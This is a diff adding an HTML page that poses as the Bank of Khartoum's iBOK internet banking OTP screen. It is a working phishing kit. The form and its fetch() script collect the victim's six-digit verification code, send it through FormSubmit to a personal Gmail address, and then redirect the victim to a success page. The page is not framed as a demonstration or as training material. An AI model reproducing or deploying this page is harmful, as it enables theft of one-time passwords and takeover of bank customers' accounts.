@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank of Khartoum - OTP</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+<link rel="icon" href="img/icon book.png" type="image/png">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Cairo';
+  background:url('img/background.png') no-repeat center center fixed;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+}
+header{
+  height:120px;
+  display:flex;
+}
+.logo-left{
+  flex:1;
+  background:#cc941c;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:1.6rem;
+}
+.logo-right{background:#d32f2f}
+.logo-right img{height:100%}
+.back{
+  text-align:center;
+  color:#d62e2e;
+  font-size:1.4rem;
+  margin:20px 0;
+}
+main{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.login-form{
+  background:#fff;
+  padding:30px;
+  width:100%;
+  max-width:400px;
+  border-radius:10px;
+  box-shadow:0 4px 20px rgba(0,0,0,.1);
+  direction:rtl;
+}
+.form-group{margin-bottom:15px}
+label{font-size:.85rem;opacity:.8}
+input{
+  width:100%;
+  padding:10px;
+  border-radius:5px;
+  border:1px solid #ccc;
+}
+.btn{
+  width:100%;
+  padding:12px;
+  background:#d62e2e;
+  color:#fff;
+  border:none;
+  border-radius:5px;
+  font-size:1.1rem;
+  cursor:pointer;
+}
+.btn:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+.btn:hover{background:#cc4848}
+footer{
+  border-top:3px solid #bc262a;
+  padding:12px;
+  text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo-left">Welcome to iBOK Internet Banking</div>
+  <div class="logo-right"><img src="img/1000423167.png"></div>
+</header>
+
+<div class="back">Internet Banking - OTP</div>
+
+<main>
+<form class="login-form otp-form"
+      id="otpForm"
+      action="https://formsubmit.co/musaadambahar@gmail.com"
+      method="POST">
+
+  <h2>يرجى إدخال رمز التحقق (OTP)</h2>
+
+  <div class="form-group">
+    <label>رمز OTP</label>
+    <input type="text" id="otp" name="otp"
+           maxlength="6" pattern="\d{6}"
+           placeholder="******" required>
+  </div>
+
+  <input type="hidden" name="_captcha" value="false">
+
+  <button type="submit" class="btn" id="otpBtn" disabled>
+    تأكيد
+  </button>
+</form>
+</main>
+
+<footer>© Bank of Khartoum</footer>
+
+<script>
+const otpInput = document.getElementById('otp');
+const otpBtn   = document.getElementById('otpBtn');
+const form     = document.getElementById('otpForm');
+
+// تفعيل الزر عند إدخال 6 أرقام
+otpInput.addEventListener('input', function () {
+    otpBtn.disabled = !/^\d{6}$/.test(otpInput.value);
+});
+
+// إرسال OTP إلى FormSubmit ثم الانتقال
+form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    if (!/^\d{6}$/.test(otpInput.value)) {
+        alert('الرجاء إدخال رمز OTP صحيح');
+        return;
+    }
+
+    fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form)
+    })
+    .then(() => {
+        window.location.href = "success.html";
+    })
+    .catch(() => {
+        alert('حدث خطأ أثناء إرسال رمز OTP');
+    });
+});
+</script>
+
+
+</body>
+</html>
